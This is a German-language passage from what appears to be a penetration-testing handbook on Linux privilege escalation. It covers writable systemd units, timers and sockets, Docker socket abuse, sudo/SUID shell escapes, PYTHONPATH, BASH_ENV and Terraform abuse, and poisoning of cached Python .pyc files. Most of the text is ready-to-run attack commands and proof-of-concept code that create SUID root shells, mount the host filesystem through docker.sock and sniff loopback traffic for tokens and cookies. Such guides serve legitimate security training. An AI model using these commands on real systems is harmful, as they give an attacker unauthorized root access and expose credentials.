Prüfe, ob du in eine `.service`-Datei schreiben kannst. Falls ja, **könntest du sie ändern**, sodass sie deine **backdoor ausführt, wenn** der Dienst **gestartet**, **neu gestartet** oder **beendet** wird (möglicherweise musst du warten, bis der Computer neu gestartet wird).\
Erstelle deine backdoor beispielsweise innerhalb der .service-Datei mit **`ExecStart=/tmp/script.sh`**

### Beschreibbare Dienst-Binaries

Beachte, dass du Binaries, die von Diensten ausgeführt werden, für backdoors ändern kannst, wenn du **Schreibberechtigungen dafür hast**. Wenn die Dienste erneut ausgeführt werden, werden dadurch die backdoors ausgeführt.

### systemd PATH - Relative Pfade

Du kannst den von **systemd** verwendeten PATH mit folgendem Befehl anzeigen:
```bash
systemctl show-environment
```
Wenn du feststellst, dass du in **einen** der Ordner des Pfads **schreiben** kannst, bist du möglicherweise in der Lage, **Privilegien zu eskalieren**. Du musst nach **relativen Pfaden suchen, die in Service-Konfigurationsdateien verwendet werden**, wie zum Beispiel:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Erstelle anschließend eine **ausführbare Datei** mit demselben Namen wie das Binary des relativen Pfads innerhalb des beschreibbaren systemd-PATH-Ordners. Wenn der Service aufgefordert wird, die verwundbare Aktion (**Start**, **Stop**, **Reload**) auszuführen, wird dein **backdoor** ausgeführt (unprivilegierte Benutzer können Services normalerweise nicht starten/stoppen, aber prüfe mit `sudo -l`, ob du dies tun kannst).

**Weitere Informationen zu Services findest du mit `man systemd.service`.**

## **Timer**

**Timer** sind systemd-Unit-Dateien, deren Name auf `**.timer**` endet und die `**.service**`-Dateien oder Ereignisse steuern. **Timer** können als Alternative zu cron verwendet werden, da sie integrierte Unterstützung für Kalenderzeitereignisse und monotone Zeitereignisse bieten und asynchron ausgeführt werden können.

Du kannst alle Timer mit folgendem Befehl auflisten:
```bash
systemctl list-timers --all
```
### Beschreibbare Timer

Wenn du einen Timer ändern kannst, kannst du ihn dazu bringen, vorhandene `systemd.unit`-Objekte (wie einen `.service` oder ein `.target`) auszuführen.
```bash
Unit=backdoor.service
```
In der Dokumentation können Sie nachlesen, was eine Unit ist:

> Die Unit, die aktiviert werden soll, wenn dieser Timer abläuft. Das Argument ist ein Unit-Name ohne das Suffix ".timer". Falls nicht angegeben, wird standardmäßig ein Service verwendet, der denselben Namen wie die Timer-Unit trägt, abgesehen vom Suffix. (Siehe oben.) Es wird empfohlen, dass der Name der aktivierten Unit und der Name der Timer-Unit bis auf das Suffix identisch sind.

Um diese Berechtigung auszunutzen, müssten Sie daher:

- Eine systemd-Unit (z. B. einen `.service`) finden, die eine **beschreibbare Binärdatei ausführt**
- Eine systemd-Unit finden, die einen **relativen Pfad ausführt**, und über **beschreibbare Berechtigungen für den systemd PATH** verfügen (um diese ausführbare Datei zu imitieren)

**Weitere Informationen zu Timern finden Sie unter `man systemd.timer`.**

### **Timer aktivieren**

Um einen Timer zu aktivieren, benötigen Sie Root-Berechtigungen und müssen Folgendes ausführen:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Beachte: Der **timer** wird durch das Erstellen eines Symlinks darauf unter `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` **aktiviert**.

## Sockets

Unix Domain Sockets (UDS) ermöglichen **Prozesskommunikation** auf derselben oder auf unterschiedlichen Maschinen innerhalb von Client-Server-Modellen. Sie verwenden standardmäßige Unix-Deskriptordateien für die Kommunikation zwischen Computern und werden über `.socket`-Dateien eingerichtet.

Sockets können mithilfe von `.socket`-Dateien konfiguriert werden.

**Erfahre mehr über Sockets mit `man systemd.socket`.** In dieser Datei können mehrere interessante Parameter konfiguriert werden:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Diese Optionen unterscheiden sich, dienen aber zusammengefasst dazu, **anzugeben, wo auf dem Socket gelauscht wird** (der Pfad der AF_UNIX-Socket-Datei, die IPv4/6-Adresse und/oder Portnummer, auf der gelauscht werden soll usw.)
- `Accept`: Akzeptiert ein boolesches Argument. Wenn **true**, wird für jede eingehende Verbindung eine **service instance gestartet**, und nur der Verbindungssocket wird an sie übergeben. Wenn **false**, werden alle Listening-Sockets selbst an die **gestartete service unit übergeben**, und für alle Verbindungen wird nur eine service unit gestartet. Dieser Wert wird für Datagram-Sockets und FIFOs ignoriert, bei denen eine einzelne service unit den gesamten eingehenden Datenverkehr unbedingt verarbeitet. **Standardmäßig false**. Aus Performancegründen wird empfohlen, neue Daemons nur so zu schreiben, dass sie für `Accept=no` geeignet sind.
- `ExecStartPre`, `ExecStartPost`: Akzeptieren eine oder mehrere Befehlszeilen, die jeweils **vor** oder **nach** dem **Erstellen** und Binden der Listening-**Sockets**/FIFOs **ausgeführt** werden. Das erste Token der Befehlszeile muss ein absoluter Dateiname sein, gefolgt von den Argumenten für den Prozess.
- `ExecStopPre`, `ExecStopPost`: Zusätzliche **Befehle**, die jeweils **vor** oder **nach** dem **Schließen** und Entfernen der Listening-**Sockets**/FIFOs **ausgeführt** werden.
- `Service`: Gibt den Namen der **service unit** an, die bei **eingehendem Datenverkehr** **aktiviert** werden soll. Diese Einstellung ist nur für Sockets mit Accept=no zulässig. Standardmäßig wird der service aktiviert, der denselben Namen wie der Socket trägt (mit ersetzt suffix). In den meisten Fällen sollte diese Option nicht erforderlich sein.

### Beschreibbare .socket-Dateien

Wenn du eine **beschreibbare** `.socket`-Datei findest, kannst du am Anfang des Abschnitts `[Socket]` etwas wie `ExecStartPre=/home/kali/sys/backdoor` **hinzufügen**, und die backdoor wird ausgeführt, bevor der Socket erstellt wird. Daher musst du **wahrscheinlich warten, bis die Maschine neu gestartet wird.**\
_Beachte, dass das System diese Socket-Dateikonfiguration verwenden muss, da die backdoor sonst nicht ausgeführt wird._

### Socket activation + beschreibbarer unit-Pfad (fehlenden service erstellen)

Eine weitere schwerwiegende Fehlkonfiguration ist:

- eine Socket unit mit `Accept=no` und `Service=<name>.service`
- die referenzierte service unit fehlt
- ein Angreifer kann in `/etc/systemd/system` (oder einen anderen unit search path) schreiben

In diesem Fall kann der Angreifer `<name>.service` erstellen und anschließend Datenverkehr an den Socket senden, sodass systemd den neuen service als root lädt und ausführt.

Kurzer Ablauf:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Schreibbare Sockets

Wenn du **einen beschreibbaren Socket identifizierst** (_hier sprechen wir über Unix-Sockets und nicht über die Konfigurationsdateien `.socket`_), dann **kannst du mit diesem Socket kommunizieren** und möglicherweise eine Schwachstelle ausnutzen.

### Unix-Sockets auflisten
```bash
netstat -a -p --unix
```
### Rohe Verbindung
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Ausnutzungsbeispiel:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP-Sockets

Beachte, dass möglicherweise einige **Sockets auf HTTP-Anfragen lauschen** (_ich spreche nicht von .socket-Dateien, sondern von Dateien, die als Unix-Sockets fungieren_). Du kannst dies überprüfen mit:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Wenn der Socket auf eine **HTTP**-Anfrage **antwortet**, kannst du mit ihm **kommunizieren** und möglicherweise eine **Schwachstelle ausnutzen**.

### Writable Docker Socket

Der Docker-Socket, der häufig unter `/var/run/docker.sock` zu finden ist, ist eine kritische Datei, die geschützt werden sollte. Standardmäßig ist sie für den Benutzer `root` und Mitglieder der Gruppe `docker` beschreibbar. Schreibzugriff auf diesen Socket kann zu einer Privilege Escalation führen. Hier ist eine Übersicht darüber, wie dies möglich ist, sowie über alternative Methoden, falls die Docker CLI nicht verfügbar ist.

#### **Privilege Escalation mit Docker CLI**

Wenn du Schreibzugriff auf den Docker-Socket hast, kannst du deine Privilegien mit den folgenden Befehlen erhöhen:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Diese Befehle ermöglichen es dir, einen Container mit root-Zugriff auf das Dateisystem des Hosts auszuführen.

#### **Direkte Verwendung der Docker API**

Wenn die Docker CLI nicht verfügbar ist, kann der Docker-Socket weiterhin über rohes HTTP über den Unix-Socket missbraucht werden. Der zuverlässigste Ablauf ist:

- einen langlebigen Helper-Container mit dem Root-Verzeichnis des Hosts als Bind-Mount erstellen
- ihn starten
- eine `exec`-Instanz innerhalb dieses Helpers erstellen
- die `exec`-Instanz starten und die Ausgabe über die API zurücklesen

**Docker-Images auflisten**
```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```
**Hilfscontainer erstellen und starten**
```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
"http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
-X POST "http://localhost/v1.47/containers/${HELPER}/start"
```
**Eine exec-Instanz erstellen**
```bash
EXEC_ID=$(
curl -s --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
"http://localhost/v1.47/containers/${HELPER}/exec" \
| tr -d '\n' \
| sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```
**Starten Sie die exec-Instanz und lesen Sie die Ausgabe**
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Detach":false,"Tty":true}' \
"http://localhost/v1.47/exec/${EXEC_ID}/start"
```
Dieses Muster ist in der Regel robuster, als `attach` manuell mit `socat` oder `nc -U` zu steuern. Sobald du einen Helper mit `/:/host` erstellen kannst, kannst du zusätzliche `exec`-Instanzen verwenden, um Dateien wie `/host/root/...` zu lesen, SSH-Keys unter `/host/root/.ssh` hinzuzufügen oder Startup-Dateien des Hosts zu ändern.

### Weitere Möglichkeiten

Beachte, dass du [**mehr Möglichkeiten zur Privilege Escalation**](../../user-information/interesting-groups-linux-pe/index.html#docker-group) hast, wenn du Schreibberechtigungen für den docker socket besitzt, weil du **Mitglied der Gruppe `docker` bist**. Wenn die [**docker API auf einem Port lauscht**, kannst du sie möglicherweise ebenfalls kompromittieren](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Weitere Möglichkeiten, aus Containern auszubrechen oder Container-Runtimes für Privilege Escalation zu missbrauchen, findest du unter:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Privilege Escalation mit Containerd (ctr)

Wenn du feststellst, dass du den Befehl **`ctr`** verwenden kannst, lies die folgende Seite, da du ihn möglicherweise für Privilege Escalation missbrauchen kannst:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Privilege Escalation mit **RunC**

Wenn du feststellst, dass du den Befehl **`runc`** verwenden kannst, lies die folgende Seite, da du ihn möglicherweise für Privilege Escalation missbrauchen kannst:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ist ein ausgeklügeltes **Inter-Process-Communication-System (IPC-System)**, das Anwendungen eine effiziente Interaktion und den Austausch von Daten ermöglicht. Es wurde mit Blick auf moderne Linux-Systeme entwickelt und bietet ein robustes Framework für verschiedene Formen der Kommunikation zwischen Anwendungen.

Das System ist vielseitig und unterstützt grundlegendes IPC, das den Datenaustausch zwischen Prozessen verbessert und an **erweiterte UNIX-Domain-Sockets** erinnert. Außerdem unterstützt es das Broadcasten von Events oder Signalen und ermöglicht dadurch eine nahtlose Integration zwischen Systemkomponenten. Beispielsweise kann ein Signal eines Bluetooth-Daemons über einen eingehenden Anruf einen Music Player dazu veranlassen, die Wiedergabe stummzuschalten, wodurch die Benutzererfahrung verbessert wird. Zusätzlich unterstützt D-Bus ein Remote-Object-System, das Service-Anfragen und Method-Aufrufe zwischen Anwendungen vereinfacht und Prozesse optimiert, die traditionell komplex waren.

D-Bus arbeitet nach einem **Allow/Deny-Modell**, das Nachrichtenberechtigungen (Method Calls, Signal-Emissionen usw.) auf Grundlage der kumulativen Wirkung übereinstimmender Policy-Regeln verwaltet. Diese Policies legen Interaktionen mit dem Bus fest und können durch die Ausnutzung dieser Berechtigungen möglicherweise Privilege Escalation ermöglichen.

Ein Beispiel für eine solche Policy in `/etc/dbus-1/system.d/wpa_supplicant.conf` ist unten angegeben. Sie beschreibt die Berechtigungen des Root-Users, `fi.w1.wpa_supplicant1` zu besitzen sowie Nachrichten an diesen Dienst zu senden und von ihm zu empfangen.

Policies ohne angegebenen User oder ohne angegebene Gruppe gelten universell, während Policies im Kontext `"default"` für alle Fälle gelten, die nicht durch andere spezifische Policies abgedeckt sind.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Erfahre hier, wie du eine D-Bus-Kommunikation enumerierst und ausnutzt:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netzwerk**

Es ist immer interessant, das Netzwerk zu enumerieren und die Position des Rechners zu bestimmen.

### Generische Enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Schnelle Triage der ausgehenden Filterung

Wenn der Host Befehle ausführen kann, aber Callbacks fehlschlagen, unterscheide schnell zwischen DNS-, Transport-, Proxy- und Routenfilterung:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Offene Ports

Überprüfe immer die auf dem Rechner laufenden Netzwerkdienste, mit denen du vor dem Zugriff nicht interagieren konntest:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Klassifiziere Listener nach ihrem Bind-Ziel:

- `0.0.0.0` / `[::]`: auf allen lokalen Schnittstellen erreichbar.
- `127.0.0.1` / `::1`: nur lokal erreichbar (gute Kandidaten für Tunnel/Forwarding).
- Bestimmte interne IPs (z. B. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): normalerweise nur aus internen Netzwerksegmenten erreichbar.

### Triage-Workflow für nur lokal erreichbare Services

Wenn du einen Host kompromittierst, sind Services, die an `127.0.0.1` gebunden sind, häufig erstmals über deine Shell erreichbar. Ein schneller lokaler Workflow ist:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS als network scanner (nur network-Modus)

Neben lokalen PE-Prüfungen kann linPEAS als fokussierter network scanner ausgeführt werden. Es verwendet verfügbare Binaries in `$PATH` (typischerweise `fping`, `ping`, `nc`, `ncat`) und installiert keine Tools.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Wenn du `-d`, `-p` oder `-i` ohne `-t` übergibst, verhält sich linPEAS wie ein reiner Network Scanner und überspringt die übrigen Privilege-Escalation-Prüfungen.

### Sniffing

Prüfe, ob du Traffic sniffen kannst. Wenn dies möglich ist, könntest du einige Credentials abgreifen.
```
timeout 1 tcpdump
```
Schnelle praktische Überprüfungen:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) ist bei der Post-Exploitation besonders wertvoll, da viele nur intern erreichbare Dienste dort Tokens/Cookies/Zugangsdaten offenlegen:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Jetzt erfassen, später parsen:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Benutzer

### Allgemeine Enumeration

Überprüfe, **wer** du bist, über welche **Berechtigungen** du verfügst, welche **Benutzer** auf den Systemen vorhanden sind, welche sich **anmelden** können und welche über **Root-Berechtigungen** verfügen:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Einige Linux-Versionen waren von einem Bug betroffen, der es Benutzern mit **UID > INT_MAX** ermöglicht, ihre Rechte zu erweitern. Weitere Informationen: [hier](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [hier](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) und [hier](https://twitter.com/paragonsec/status/1071152249529884674).\
**Nutze den Exploit** mit: **`systemd-run -t /bin/bash`**

### Gruppen

Prüfe, ob du **Mitglied einer Gruppe** bist, die dir Root-Rechte gewähren könnte:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Zwischenablage

Prüfe, ob sich etwas Interessantes in der Zwischenablage befindet (falls möglich)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Passwortrichtlinie
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekannte Passwörter

Wenn du **ein Passwort** der Umgebung **kennst**, **versuche, dich mit diesem Passwort als jeder Benutzer anzumelden**.

### Su Brute

Wenn es dir nichts ausmacht, viel Aufmerksamkeit zu erregen, und die Binärdateien `su` und `timeout` auf dem Computer vorhanden sind, kannst du versuchen, Benutzer mit [su-bruteforce](https://github.com/carlospolop/su-bruteforce) per Brute-Force zu testen.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) versucht mit dem Parameter `-a` ebenfalls, Benutzer per Brute-Force zu testen.

## Missbrauch eines beschreibbaren PATH

### $PATH

Wenn du feststellst, dass du **in einen Ordner innerhalb von $PATH schreiben** kannst, kannst du möglicherweise durch **Erstellen einer Backdoor im beschreibbaren Ordner** deine Privilegien erhöhen. Diese muss den Namen eines Befehls tragen, der von einem anderen Benutzer (idealerweise root) ausgeführt wird und der **nicht aus einem Ordner geladen wird, der im $PATH vor deinem beschreibbaren Ordner liegt**.

### SUDO und SUID

Möglicherweise darfst du bestimmte Befehle mit sudo ausführen oder sie verfügen über das SUID-Bit. Überprüfe dies mit:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Einige **unerwartete Befehle ermöglichen es, Dateien zu lesen und/oder zu schreiben oder sogar einen Befehl auszuführen.** Zum Beispiel:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Die Sudo-Konfiguration kann einem Benutzer erlauben, einen bestimmten Befehl mit den Rechten eines anderen Benutzers auszuführen, ohne das Passwort zu kennen.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In diesem Beispiel kann der Benutzer `demo` `vim` als `root` ausführen. Nun ist es trivial, eine Shell zu erhalten, indem ein SSH-Schlüssel in das Root-Verzeichnis eingefügt oder `sh` aufgerufen wird.
```
sudo vim -c '!sh'
```
### SETENV

Diese Direktive ermöglicht es dem Benutzer, beim Ausführen von etwas eine **Umgebungsvariable zu setzen**:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Dieses Beispiel, **basierend auf der HTB-Maschine Admirer**, war **anfällig** für **PYTHONPATH hijacking**, wodurch eine beliebige Python-Bibliothek geladen werden konnte, während das Skript als root ausgeführt wurde:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Vergiftung eines beschreibbaren `__pycache__` / `.pyc` bei von sudo erlaubten Python-Imports

Wenn ein **von sudo erlaubtes Python-Script** ein Modul importiert, dessen Paketverzeichnis ein **beschreibbares `__pycache__`** enthält, kannst du möglicherweise den gecachten `.pyc` ersetzen und beim nächsten Import Codeausführung als privilegierter Benutzer erreichen.

- Warum es funktioniert:
- CPython speichert Bytecode-Caches in `__pycache__/module.cpython-<ver>.pyc`.
- Der Interpreter validiert den **Header** (Magic + Zeitstempel-/Hash-Metadaten, die an den Quellcode gebunden sind) und führt anschließend das nach diesem Header gespeicherte, marshalisierte Codeobjekt aus.
- Wenn du die gecachte Datei löschen und neu erstellen kannst, weil das Verzeichnis beschreibbar ist, kann eine root-eigene, aber nicht beschreibbare `.pyc` trotzdem ersetzt werden.
- Typischer Pfad:
- `sudo -l` zeigt ein Python-Script oder einen Wrapper, den du als root ausführen kannst.
- Das Script importiert ein lokales Modul aus `/opt/app/`, `/usr/local/lib/...` usw.
- Das `__pycache__`-Verzeichnis des importierten Moduls ist für deinen Benutzer oder für alle beschreibbar.

Schnelle Auflistung:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Wenn du das privilegierte Skript untersuchen kannst, ermittle die importierten Module und deren Cache-Pfad:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Abuse-Workflow:

1. Führe das sudo-erlaubte Script einmal aus, damit Python die legitime Cache-Datei erstellt, falls sie noch nicht existiert.
2. Lies die ersten 16 Bytes aus der legitimen `.pyc`-Datei und verwende sie in der vergifteten Datei wieder.
3. Kompiliere ein Payload-Codeobjekt, führe `marshal.dumps(...)` darauf aus, lösche die ursprüngliche Cache-Datei und erstelle sie mit dem ursprünglichen Header plus deinem schädlichen Bytecode neu.
4. Führe das sudo-erlaubte Script erneut aus, damit der Import dein Payload als root ausführt.

Wichtige Hinweise:

- Die Wiederverwendung des ursprünglichen Headers ist entscheidend, weil Python die Cache-Metadaten mit der Quelldatei abgleicht und nicht prüft, ob der Bytecode-Inhalt tatsächlich zur Quelldatei passt.
- Dies ist besonders nützlich, wenn die Quelldatei root-owned und nicht beschreibbar ist, das sie enthaltende `__pycache__`-Verzeichnis jedoch beschreibbar ist.
- Der Angriff schlägt fehl, wenn der privilegierte Prozess `PYTHONDONTWRITEBYTECODE=1` verwendet, aus einer Location mit sicheren Berechtigungen importiert oder den Schreibzugriff auf jedes Verzeichnis im Import-Pfad entfernt.

Minimale Proof-of-Concept-Struktur:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Härtung:

- Stelle sicher, dass kein Verzeichnis im privilegierten Python-Importpfad für Benutzer mit niedrigen Berechtigungen beschreibbar ist, einschließlich `__pycache__`.
- Ziehe für privilegierte Ausführungen `PYTHONDONTWRITEBYTECODE=1` sowie regelmäßige Prüfungen auf unerwartet beschreibbare `__pycache__`-Verzeichnisse in Betracht.
- Behandle beschreibbare lokale Python-Module und beschreibbare Cache-Verzeichnisse genauso wie beschreibbare Shell-Skripte oder Shared Libraries, die von root ausgeführt werden.

### Über sudo env_keep erhaltenes BASH_ENV → root-Shell

Wenn sudoers `BASH_ENV` beibehält (z. B. `Defaults env_keep+="ENV BASH_ENV"`), kannst du Bashs Startverhalten für nicht-interaktive Shells ausnutzen, um beim Aufruf eines erlaubten Befehls beliebigen Code als root auszuführen.

- Warum es funktioniert: Bei nicht-interaktiven Shells wertet Bash `$BASH_ENV` aus und lädt diese Datei, bevor das Zielskript ausgeführt wird. Viele sudo-Regeln erlauben die Ausführung eines Skripts oder Shell-Wrappers. Wenn `BASH_ENV` von sudo beibehalten wird, wird deine Datei mit root-Berechtigungen geladen.

- Voraussetzungen:
- Eine sudo-Regel, die du ausführen kannst (jedes Ziel, das `/bin/bash` nicht-interaktiv aufruft, oder jedes Bash-Skript).
- `BASH_ENV` ist in `env_keep` enthalten (prüfe dies mit `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Härtung:
- Entferne `BASH_ENV` (und `ENV`) aus `env_keep`; bevorzuge `env_reset`.
- Vermeide Shell-Wrapper für über sudo erlaubte Befehle; verwende minimale Binaries.
- Ziehe sudo-I/O-Logging und Alarmierung in Betracht, wenn beibehaltene Umgebungsvariablen verwendet werden.

### Terraform via sudo mit beibehaltenem HOME (!env_reset)

Wenn sudo die Umgebung unverändert lässt (`!env_reset`) und `terraform apply` erlaubt, bleibt `$HOME` der aufrufende Benutzer. Terraform lädt daher **$HOME/.terraformrc** als root und berücksichtigt `provider_installation.dev_overrides`.

- Verweise den erforderlichen Provider auf ein beschreibbares Verzeichnis und lege ein bösartiges Plugin mit dem Namen des Providers ab (z. B. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
